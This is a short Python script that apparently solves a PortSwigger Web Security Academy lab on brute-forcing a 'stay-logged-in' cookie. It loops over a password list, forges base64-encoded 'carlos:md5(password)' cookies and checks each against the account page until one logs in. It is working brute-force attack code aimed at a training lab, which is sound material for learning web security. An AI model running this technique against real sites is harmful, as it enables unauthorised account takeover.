# https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie


import requests
import base64
import hashlib


with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()


url = 'https://....web-security-academy.net/my-account'


for password in passwords:

    cookies = {
        'stay-logged-in': base64.b64encode(f'carlos:{hashlib.md5(password.encode()).hexdigest()}'.encode()).decode()
    }
    r = requests.get(url=url, cookies=cookies)
    
    if 'Your username is' in r.text:
        print('Password: ', password)
        break
